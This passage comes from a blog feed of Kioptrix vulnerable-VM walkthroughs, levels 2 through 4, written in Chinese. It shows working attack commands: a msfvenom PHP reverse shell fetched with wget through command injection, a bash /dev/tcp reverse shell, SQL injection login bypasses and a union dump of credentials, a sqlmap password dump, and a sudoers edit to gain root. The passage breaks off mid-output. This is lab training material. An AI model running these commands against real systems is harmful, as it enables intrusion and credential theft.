<span>(</span>RSA<span>)</span>\n<span>80</span>/tcp   <span>open</span>  http     Apache httpd <span>2.0</span>.52 <span><span>((</span>CentOS<span>))</span></span>\n<span>|</span>_http-title: Site doesn<span>'t have a title (text/html; charset=UTF-8).\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.0.52 (CentOS)\n111/tcp  open  rpcbind  2 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|   100000  2            111/udp   rpcbind\n|   100024  1            673/udp   status\n|_  100024  1            676/tcp   status\n443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))\n| sslv2: \n|   SSLv2 supported\n|   ciphers: \n|     SSL2_RC2_128_CBC_WITH_MD5\n|     SSL2_RC4_128_WITH_MD5\n|     SSL2_RC4_128_EXPORT40_WITH_MD5\n|     SSL2_DES_64_CBC_WITH_MD5\n|     SSL2_DES_192_EDE3_CBC_WITH_MD5\n|     SSL2_RC4_64_WITH_MD5\n|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5\n|_http-title: Site doesn'</span>t have a title <span>(</span>text/html<span>;</span> <span>charset</span><span>=</span>UTF-8<span>)</span>.\n<span>|</span> http-methods: \n<span>|</span>_  Supported Methods: GET HEAD POST OPTIONS\n<span>|</span> ssl-cert: Subject: <span>commonName</span><span>=</span>localhost.localdomain/organizationName<span>=</span>SomeOrganization/stateOrProvinceName<span>=</span>SomeState/countryName<span>=</span>--\n<span>|</span> Issuer: <span>commonName</span><span>=</span>localhost.localdomain/organizationName<span>=</span>SomeOrganization/stateOrProvinceName<span>=</span>SomeState/countryName<span>=</span>--\n<span>|</span> Public Key type: rsa\n<span>|</span> Public Key bits: <span>1024</span>\n<span>|</span> Signature Algorithm: md5WithRSAEncryption\n<span>|</span> Not valid before: <span>2009</span>-10-08T00:10:47\n<span>|</span> Not valid after:  <span>2010</span>-10-08T00:10:47\n<span>|</span> MD5:   01de 29f9 fbfb 2eb2 beaf e624 <span>3157</span> 090f\n<span>|</span>_SHA-1: 560c <span>9196</span> <span>6506</span> fb0f fb81 66b1 ded3 ac11 2ed4 808a\n<span>|</span>_http-server-header: Apache/2.0.52 <span>(</span>CentOS<span>)</span>\n<span>|</span>_ssl-date: <span>2022</span>-03-21T18:14:39+00:00<span>;</span> +11h59m58s from scanner time.\n<span>631</span>/tcp  <span>open</span>  ipp      CUPS <span>1.1</span>\n<span>|</span>_http-title: <span>403</span> Forbidden\n<span>|</span> http-methods: \n<span>|</span>   Supported Methods: GET HEAD OPTIONS POST PUT\n<span>|</span>_  Potentially risky methods: PUT\n<span>|</span>_http-server-header: CUPS/1.1\n<span>676</span>/tcp  <span>open</span>  status   <span>1</span> <span>(</span>RPC <span>#100024)</span>\n<span>3306</span>/tcp <span>open</span>  mysql    MySQL <span>(</span>unauthorized<span>)</span>\n\nHost script results:\n<span>|</span>_clock-skew: 11h59m57s\n\nNSE: Script Post-scanning.\nInitiating NSE at 02:14\nCompleted NSE at 02:14, <span>0</span>.00s elapsed\nInitiating NSE at 02:14\nCompleted NSE at 02:14, <span>0</span>.00s elapsed\nInitiating NSE at 02:14\nCompleted NSE at 02:14, <span>0</span>.00s elapsed\nRead data files from: /usr/bin/<span>..</span>/share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ <span>.</span>\nNmap done: <span>1</span> IP address <span>(</span><span>1</span> <span>host</span> up<span>)</span> scanned <span>in</span> <span>16.19</span> seconds\n\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br></div></div><h2 id=\"_0x02-方法一\"> 0x02 方法一</h2>\n<p>发现http，浏览器访问</p>\n<p><img src=\"/assets/img/image-20220421171529469.png\" alt=\"image-20220321152724123\" /></p>\n<p>使用admin，万能密码<code>' or 1=1#</code>登录成功，发现是个ping功能页面，尝试命令注入</p>\n<p><img src=\"/assets/img/image-20220421171539968.png\" alt=\"image-20220421171539968\" /></p>\n<p>根据结果发现id被执行，存在命令注入漏洞</p>\n<p><img src=\"/assets/img/image-20220421171546679.png\" alt=\"image-20220421171546679\" /></p>\n<p><img src=\"/assets/img/image-20220421171552505.png\" alt=\"image-20220421171552505\" /></p>\n<p>根据服务器使用php，准备回弹shell，使用msfvenom，生成php反弹shell</p>\n<div><pre><code>msfvenom -p php/meterpreter/reverse_tcp <span>LHOST</span><span>=</span><span>192.168</span>.56.102 <span>LPORT</span><span>=</span><span>4444</span> -f raw <span>></span> /home/kali/shell.php\n</code></pre>\n<div><span>1</span><br></div></div><p>使用msf监听回弹端口</p>\n<p><img src=\"/assets/img/image-20220421171601683.png\" alt=\"image-20220421171601683\" /></p>\n<p>命令注入页面提交<code>127.0.0.1;cd /tmp;wget http://192.168.56.102:8090/shell.php</code> 传输php反弹shell</p>\n<p>再提交；<code>cd /tmp &amp;&amp; php -f shell.php</code>,反弹成功，获得shell</p>\n<p><img src=\"/assets/img/image-20220421171608325.png\" alt=\"image-20220421171608325\" /></p>\n<p>查看Linux内核版本</p>\n<p><img src=\"/assets/img/image-20220421171613148.png\" alt=\"image-20220421171613148\" /></p>\n<p><img src=\"/assets/img/image-20220421171617723.png\" alt=\"image-20220421171617723\" /></p>\n<p>搜索版本对应exp</p>\n<p><img src=\"/assets/img/image-20220421171638016.png\" alt=\"image-20220421171638016\" /></p>\n<p>尝试9545.c，提权成功</p>\n<p><img src=\"/assets/img/image-20220421171642095.png\" alt=\"image-20220421171642095\" /></p>\n<h2 id=\"_0x03-方法二\"> 0x03 方法二</h2>\n<p>命令注入页面输入localhost; bash -i &gt;&amp; /dev/tcp/192.168.56.102/4444 0&gt;&amp;1</p>\n<p>攻击机使用nc -nlvp 4444监听</p>\n<p>回弹shell</p>\n",
      "image": "http://www.liuhanzhe.com/assets/img/image-20220421171529469.png",
      "date_published": "2022-03-22T00:00:00.000Z",
      "date_modified": "2022-04-21T09:36:50.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "靶机 KIOPTRIX:LEVEL 3 Walkthrough",
      "url": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/Kioptrix_3/",
      "id": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/Kioptrix_3/",
      "content_html": "<p>扫描目标</p>\n<div><pre><code>└─<span># nmap -T5 -A -v -p- 192.168.197.130</span>\nStarting Nmap <span>7.92</span> <span>(</span> https://nmap.org <span>)</span> at <span>2022</span>-03-21 04:47 EDT\nNSE: Loaded <span>155</span> scripts <span>for</span> scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 04:47\nCompleted NSE at 04:47, <span>0</span>.00s elapsed\nInitiating NSE at 04:47\nCompleted NSE at 04:47, <span>0</span>.00s elapsed\nInitiating NSE at 04:47\nCompleted NSE at 04:47, <span>0</span>.00s elapsed\nInitiating ARP Ping Scan at 04:47\nScanning <span>192.168</span>.197.130 <span>[</span><span>1</span> port<span>]</span>\nCompleted ARP Ping Scan at 04:47, <span>0</span>.04s elapsed <span>(</span><span>1</span> total hosts<span>)</span>\nInitiating Parallel DNS resolution of <span>1</span> host. at 04:47\nCompleted Parallel DNS resolution of <span>1</span> host. at 04:47, <span>13</span>.00s elapsed\nInitiating SYN Stealth Scan at 04:47\nScanning <span>192.168</span>.197.130 <span>[</span><span>65535</span> ports<span>]</span>\nDiscovered <span>open</span> port <span>22</span>/tcp on <span>192.168</span>.197.130\nDiscovered <span>open</span> port <span>80</span>/tcp on <span>192.168</span>.197.130\nCompleted SYN Stealth Scan at 04:47, <span>3</span>.96s elapsed <span>(</span><span>65535</span> total ports<span>)</span>\nInitiating Service scan at 04:47\nScanning <span>2</span> services on <span>192.168</span>.197.130\nCompleted Service scan at 04:47, <span>6</span>.02s elapsed <span>(</span><span>2</span> services on <span>1</span> <span>host</span><span>)</span>\nInitiating OS detection <span>(</span>try <span>#1) against 192.168.197.130</span>\nNSE: Script scanning <span>192.168</span>.197.130.\nInitiating NSE at 04:47\nCompleted NSE at 04:47, <span>0</span>.16s elapsed\nInitiating NSE at 04:47\nCompleted NSE at 04:47, <span>0</span>.00s elapsed\nInitiating NSE at 04:47\nCompleted NSE at 04:47, <span>0</span>.00s elapsed\nNmap scan report <span>for</span> <span>192.168</span>.197.130\nHost is up <span>(</span><span>0</span>.00059s latency<span>)</span>.\nNot shown: <span>65533</span> closed tcp ports <span>(</span>reset<span>)</span>\nPORT   STATE SERVICE VERSION\n<span>22</span>/tcp <span>open</span>  <span>ssh</span>     OpenSSH <span>4</span>.7p1 Debian 8ubuntu1.2 <span>(</span>protocol <span>2.0</span><span>)</span>\n<span>|</span> ssh-hostkey: \n<span>|</span>   <span>1024</span> <span>30</span>:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 <span>(</span>DSA<span>)</span>\n<span>|</span>_  <span>2048</span> 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd <span>(</span>RSA<span>)</span>\n<span>80</span>/tcp <span>open</span>  http    Apache httpd <span>2.2</span>.8 <span>((</span>Ubuntu<span>)</span> PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch<span>)</span>\n<span>|</span> http-cookie-flags: \n<span>|</span>   /: \n<span>|</span>     PHPSESSID: \n<span>|</span>_      httponly flag not <span>set</span>\n<span>|</span>_http-title: Ligoat Security - Got Goat? Security <span>..</span>.\n<span>|</span>_http-favicon: Unknown favicon MD5: 99EFC00391F142252888403BB1C196D2\n<span>|</span> http-methods: \n<span>|</span>_  Supported Methods: GET HEAD POST OPTIONS\n<span>|</span>_http-server-header: Apache/2.2.8 <span>(</span>Ubuntu<span>)</span> PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch\nMAC Address: 00:0C:29:5F:2B:EF <span>(</span>VMware<span>)</span>\nDevice type: general purpose\nRunning: Linux <span>2.6</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:2.6\nOS details: Linux <span>2.6</span>.9 - <span>2.6</span>.33\nUptime guess: <span>497.101</span> days <span>(</span>since Mon Nov  <span>9</span> 01:22:38 <span>2020</span><span>)</span>\nNetwork Distance: <span>1</span> hop\nTCP Sequence Prediction: <span>Difficulty</span><span>=</span><span>206</span> <span>(</span>Good luck<span>!</span><span>)</span>\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux<span>;</span> CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n<span>1</span>   <span>0.59</span> ms <span>192.168</span>.197.130\n\nNSE: Script Post-scanning.\nInitiating NSE at 04:47\nCompleted NSE at 04:47, <span>0</span>.00s elapsed\nInitiating NSE at 04:47\nCompleted NSE at 04:47, <span>0</span>.00s elapsed\nInitiating NSE at 04:47\nCompleted NSE at 04:47, <span>0</span>.00s elapsed\nRead data files from: /usr/bin/<span>..</span>/share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span>.</span>\nNmap done: <span>1</span> IP address <span>(</span><span>1</span> <span>host</span> up<span>)</span> scanned <span>in</span> <span>25.22</span> seconds\n           Raw packets sent: <span>65555</span> <span>(</span><span>2</span>.885MB<span>)</span> <span>|</span> Rcvd: <span>65551</span> <span>(</span><span>2</span>.623MB<span>)</span>\n\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br></div></div><p>存在80端口，访问</p>\n<p><img src=\"/assets/img/image-20220421172004140.png\" alt=\"image-20220421172004140\" /></p>\n<p>点击login查看，发现使用的LotusCMS</p>\n<p><img src=\"/assets/img/image-20220421172030804.png\" alt=\"image-20220421172030804\" /></p>\n<p>搜索exp</p>\n<p><img src=\"/assets/img/image-20220421172058784.png\" alt=\"image-20220421172058784\" /></p>\n<p>使用msf</p>\n<p><img src=\"/assets/img/image-20220421172102677.png\" alt=\"image-20220421172102677\" /></p>\n<p><img src=\"/assets/img/image-20220421172107234.png\" alt=\"image-20220421172107234\" /></p>\n<p>获得shell，尝试很多提权不成功</p>\n<p>重新查看页面，在http://kioptrix3.com/gallery/index.php里发现注释的文件路径</p>\n<p><img src=\"/assets/img/image-20220421172113072.png\" alt=\"image-20220421172113072\" /></p>\n<p>访问http://kioptrix3.com/gallery/gadmin/</p>\n<p><img src=\"/assets/img/image-20220421172118679.png\" alt=\"image-20220421172118679\" /></p>\n<p>再搜索exp</p>\n<p><img src=\"/assets/img/image-20220421172125489.png\" alt=\"image-20220421172125489\" /></p>\n<p>尝试sql注入，访问http://kioptrix3.com/gallery/gallery.php?id= 返回sql错误信息，确定存在sql注入</p>\n<p>通过手动注入http://kioptrix3.com/gallery/gallery.php?id=1%20or%201=0%20union%20select%201,group_concat(char(32),%20username,%20char(32),%20password)%20,3,4,5,6%20from%20dev_accounts--</p>\n<p><img src=\"/assets/img/image-20220421172131330.png\" alt=\"image-20220421172131330\" /></p>\n<p>使用https://crackstation.net/解密</p>\n<p><img src=\"/assets/img/image-20220421172137319.png\" alt=\"image-20220421172137319\" /></p>\n<p>使用loneferret账号通过ssh登录</p>\n<p><img src=\"/assets/img/image-20220421172141908.png\" alt=\"image-20220421172141908\" /></p>\n<p>在home目录下发现一个文件</p>\n<p><img src=\"/assets/img/image-20220421172146161.png\" alt=\"image-20220421172146161\" /></p>\n<p>查看ht，发现存在s权限</p>\n<p><img src=\"/assets/img/image-20220421172151403.png\" alt=\"image-20220421172151403\" /></p>\n<p>搜索ht，发现是一个二进制编辑器，可以用来编辑修改/etc/sudoers,F6切换到text内容显示</p>\n<p>在最后一行加入</p>\n<p>loneferret ALL=(ALL) ALL</p>\n<p>保存退出</p>\n<p><img src=\"/assets/img/image-20220421172158053.png\" alt=\"image-20220421172158053\" /></p>\n<p>执行sudo su，获得root</p>\n<p><img src=\"/assets/img/image-20220421172202284.png\" alt=\"image-20220421172202284\" /></p>\n<p><img src=\"/assets/img/image-20220421172206012.png\" alt=\"image-20220421172206012\" /></p>\n",
      "image": "http://www.liuhanzhe.com/assets/img/image-20220421172004140.png",
      "date_published": "2022-03-23T00:00:00.000Z",
      "date_modified": "2022-04-21T09:36:50.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "靶机 KIOPTRIX:LEVEL 4 Walkthrough",
      "url": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/Kioptrix_4/",
      "id": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/Kioptrix_4/",
      "content_html": "<p>扫描ip</p>\n<p><img src=\"/assets/img/image-20220421172327093.png\" alt=\"image-20220421172327093\" /></p>\n<p>扫描目标</p>\n<div><pre><code>└─<span># nmap -T5 -A -v -p- 192.168.197.131</span>\nStarting Nmap <span>7.92</span> <span>(</span> https://nmap.org <span>)</span> at <span>2022</span>-03-22 06:58 EDT\nNSE: Loaded <span>155</span> scripts <span>for</span> scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 06:58\nCompleted NSE at 06:58, <span>0</span>.00s elapsed\nInitiating NSE at 06:58\nCompleted NSE at 06:58, <span>0</span>.00s elapsed\nInitiating NSE at 06:58\nCompleted NSE at 06:58, <span>0</span>.00s elapsed\nInitiating ARP Ping Scan at 06:58\nScanning <span>192.168</span>.197.131 <span>[</span><span>1</span> port<span>]</span>\nCompleted ARP Ping Scan at 06:58, <span>0</span>.05s elapsed <span>(</span><span>1</span> total hosts<span>)</span>\nInitiating Parallel DNS resolution of <span>1</span> host. at 06:58\nCompleted Parallel DNS resolution of <span>1</span> host. at 06:58, <span>13</span>.01s elapsed\nInitiating SYN Stealth Scan at 06:58\nScanning <span>192.168</span>.197.131 <span>[</span><span>65535</span> ports<span>]</span>\nDiscovered <span>open</span> port <span>139</span>/tcp on <span>192.168</span>.197.131\nDiscovered <span>open</span> port <span>445</span>/tcp on <span>192.168</span>.197.131\nDiscovered <span>open</span> port <span>22</span>/tcp on <span>192.168</span>.197.131\nDiscovered <span>open</span> port <span>80</span>/tcp on <span>192.168</span>.197.131\nCompleted SYN Stealth Scan at 06:58, <span>12</span>.04s elapsed <span>(</span><span>65535</span> total ports<span>)</span>\nInitiating Service scan at 06:58\nScanning <span>4</span> services on <span>192.168</span>.197.131\nCompleted Service scan at 06:58, <span>11</span>.02s elapsed <span>(</span><span>4</span> services on <span>1</span> <span>host</span><span>)</span>\nInitiating OS detection <span>(</span>try <span>#1) against 192.168.197.131</span>\nNSE: Script scanning <span>192.168</span>.197.131.\nInitiating NSE at 06:58\nCompleted NSE at 06:59, <span>15</span>.15s elapsed\nInitiating NSE at 06:59\nCompleted NSE at 06:59, <span>0</span>.00s elapsed\nInitiating NSE at 06:59\nCompleted NSE at 06:59, <span>0</span>.00s elapsed\nNmap scan report <span>for</span> <span>192.168</span>.197.131\nHost is up <span>(</span><span>0</span>.0011s latency<span>)</span>.\nNot shown: <span>39528</span> closed tcp ports <span>(</span>reset<span>)</span>, <span>26003</span> filtered tcp ports <span>(</span>no-response<span>)</span>\nPORT    STATE SERVICE     VERSION\n<span>22</span>/tcp  <span>open</span>  <span>ssh</span>         OpenSSH <span>4</span>.7p1 Debian 8ubuntu1.2 <span>(</span>protocol <span>2.0</span><span>)</span>\n<span>|</span> ssh-hostkey: \n<span>|</span>   <span>1024</span> 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 <span>(</span>DSA<span>)</span>\n<span>|</span>_  <span>2048</span> <span>85</span>:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e <span>(</span>RSA<span>)</span>\n<span>80</span>/tcp  <span>open</span>  http        Apache httpd <span>2.2</span>.8 <span>((</span>Ubuntu<span>)</span> PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch<span>)</span>\n<span>|</span>_http-server-header: Apache/2.2.8 <span>(</span>Ubuntu<span>)</span> PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch\n<span>|</span>_http-title: Site doesn't have a title <span>(</span>text/html<span>)</span>.\n<span>|</span> http-methods: \n<span>|</span>_  Supported Methods: GET HEAD POST OPTIONS\n<span>139</span>/tcp <span>open</span>  netbios-ssn Samba smbd <span>3</span>.X - <span>4</span>.X <span>(</span>workgroup: WORKGROUP<span>)</span>\n<span>445</span>/tcp <span>open</span>  netbios-ssn Samba smbd <span>3.0</span>.28a <span>(</span>workgroup: WORKGROUP<span>)</span>\nMAC Address: 00:0C:29:E2:9B:4B <span>(</span>VMware<span>)</span>\nDevice type: general purpose\nRunning: Linux <span>2.6</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:2.6\nOS details: Linux <span>2.6</span>.9 - <span>2.6</span>.33\nUptime guess: <span>497.103</span> days <span>(</span>since Tue Nov <span>10</span> 03:30:53 <span>2020</span><span>)</span>\nNetwork Distance: <span>1</span> hop\nTCP Sequence Prediction: <span>Difficulty</span><span>=</span><span>203</span> <span>(</span>Good luck<span>!</span><span>)</span>\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux<span>;</span> CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n<span>|</span>_clock-skew: mean: 9h59m59s, deviation: 2h49m42s, median: 7h59m59s\n<span>|</span> nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <span>&lt;</span>unknown<span>></span>, NetBIOS MAC: <span>&lt;</span>unknown<span>></span> <span>(</span>unknown<span>)</span>\n<span>|</span> Names:\n<span>|</span>   KIOPTRIX<span><span>4</span>&lt;</span><span>0</span><span><span>0</span>></span>        Flags: <span>&lt;</span>unique<span>></span><span>&lt;</span>active<span>></span>\n<span>|</span>   KIOPTRIX<span><span>4</span>&lt;</span><span>0</span><span><span>3</span>></span>        Flags: <span>&lt;</span>unique<span>></span><span>&lt;</span>active<span>></span>\n<span>|</span>   KIOPTRIX<span><span>4</span>&lt;</span><span>2</span><span><span>0</span>></span>        Flags: <span>&lt;</span>unique<span>></span><span>&lt;</span>active<span>></span>\n<span>|</span>   WORKGROUP<span>&lt;</span>1e<span>></span>        Flags: <span>&lt;</span>group<span>></span><span>&lt;</span>active<span>></span>\n<span>|</span>_  WORKGROUP<span>&lt;</span><span>0</span><span><span>0</span>></span>        Flags: <span>&lt;</span>group<span>></span><span>&lt;</span>active<span>></span>\n<span>|</span>_smb2-time: Protocol negotiation failed <span>(</span>SMB2<span>)</span>\n<span>|</span> smb-security-mode: \n<span>|</span>   account_used: guest\n<span>|</span>   authentication_level: user\n<span>|</span>   challenge_response: supported\n<span>|</span>_  message_signing: disabled <span>(</span>dangerous, but default<span>)</span>\n<span>|</span> smb-os-discovery: \n<span>|</span>   OS: Unix <span>(</span>Samba <span>3.0</span>.28a<span>)</span>\n<span>|</span>   Computer name: Kioptrix4\n<span>|</span>   NetBIOS computer name: \n<span>|</span>   Domain name: localdomain\n<span>|</span>   FQDN: Kioptrix4.localdomain\n<span>|</span>_  System time: <span>2022</span>-03-22T14:58:46-04:00\n\nTRACEROUTE\nHOP RTT     ADDRESS\n<span>1</span>   <span>1.14</span> ms <span>192.168</span>.197.131\n\nNSE: Script Post-scanning.\nInitiating NSE at 06:59\nCompleted NSE at 06:59, <span>0</span>.00s elapsed\nInitiating NSE at 06:59\nCompleted NSE at 06:59, <span>0</span>.00s elapsed\nInitiating NSE at 06:59\nCompleted NSE at 06:59, <span>0</span>.00s elapsed\nRead data files from: /usr/bin/<span>..</span>/share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span>.</span>\nNmap done: <span>1</span> IP address <span>(</span><span>1</span> <span>host</span> up<span>)</span> scanned <span>in</span> <span>52.95</span> seconds\n           Raw packets sent: <span>91561</span> <span>(</span><span>4</span>.030MB<span>)</span> <span>|</span> Rcvd: <span>39547</span> <span>(</span><span>1</span>.582MB<span>)</span>\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br></div></div><p>浏览器访问</p>\n<p><img src=\"/assets/img/image-20220421172344137.png\" alt=\"image-20220421172344137\" /></p>\n<p>使用admin，万能密码' or 1=1#登录</p>\n<p><img src=\"/assets/img/image-20220421172349414.png\" alt=\"image-20220421172349414\" /></p>\n<p>发现存在sql注入，使用sqlmap</p>\n<div><pre><code>sqlmap -u <span>\"http://192.168.197.131/checklogin.php\"</span> --data <span>\"myusername=john&amp;mypassword=123&amp;Submit=Login\"</span> -p mypassword --dump \n</code></pre>\n<div><span>1</span><br></div></div><p>扫描结果</p>\n<div><pre><code>┌──(root💀kali)-[/home/kali]\n└─# sqlmap -u &quot;http://192.168.197.131/checklogin.php&quot; --data &quot;myusername=john&amp;mypassword=123&amp;Submit=Login&quot; -p mypassword --dump    \n        ___\n       __H__                                                                 \n ___ ___[&quot;]_____ ___ ___  {1.5.11#stable}                                    \n|_ -| . [(]     | .&#39;| . |                                                    \n|___|_  [(]_|_|_|__,|  _|                                                    \n      |_|V...       |_|   https://sqlmap.org                                 \n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 21:29:50 /2022-03-22/\n\n[21:29:50] [INFO] resuming back-end DBMS &#39;mysql&#39; \n[21:29:50] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: mypassword (POST)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)\n    Payload: myusername=john&amp;mypassword=-7681&#39; OR 7710=7710#&amp;Submit=Login\n\n    Type: time-based blind\n    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: myusername=john&amp;mypassword=123&#39; AND (SELECT 4970 FROM (SELECT(SLEEP(5)))HCsb)-- ztBx&amp;Submit=Login\n---\n[21:29:50] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu 8.04 (Hardy Heron)\nweb application technology: Apache 2.2.8, PHP 5.2.4\nback-end DBMS: MySQL &gt;= 5.0.12\n[21:29:50] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries\n[21:29:50] [INFO] fetching current database\n[21:29:50] [WARNING] running in a single-thread mode. Please consider usage of option &#39;--threads&#39; for faster data retrieval\n[21:29:50] [INFO] retrieved: \ngot a 302 redirect to &#39;http://192.168.197.131:80/login_success.php?username=john&#39;. Do you want to follow? [Y/n] \nredirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] \nmembers\n[21:29:55] [INFO] fetching tables for database: &#39;members&#39;\n[21:29:55] [INFO] fetching number of tables for database &#39;members&#39;\n[21:29:55] [INFO] retrieved: 1\n[21:29:55] [INFO] retrieved: members\n[21:29:56] [INFO] fetching columns for table &#39;members&#39; in database &#39;members&#39;\n[21:29:56] [INFO] retrieved: 3\n[21:29:56] [INFO] retrieved: id\n[21:29:57] [INFO] retrieved: username\n[21:29:57] [INFO] retrieved: password\n[21:29:59] [INFO] fetching entries for table &#39;members&#39; in database &#39;members&#39;\n[21:29:59] [INFO] fetching number of entries for table &#39;members&#39; in database &#39;members&#39;\n[21:29:59] [INFO] retrieved: 2\n[21:29:59] [INFO] retrieved: 1                                                                                                                                                                                \n[21:29:59] [INFO] retrieved: MyNameIsJohn                                                                                                                                                                     \n[21:30:01] [INFO] retrieved: john                                                                                                                                                                             \n[21:30:01] [INFO] retrieved: 2                                                                                                                                                                                \n[21:30:02] [INFO] retrieved: ADGAdsafdfwt4gadfga==                                                                                                                                                            \n[21:30:04] [INFO] 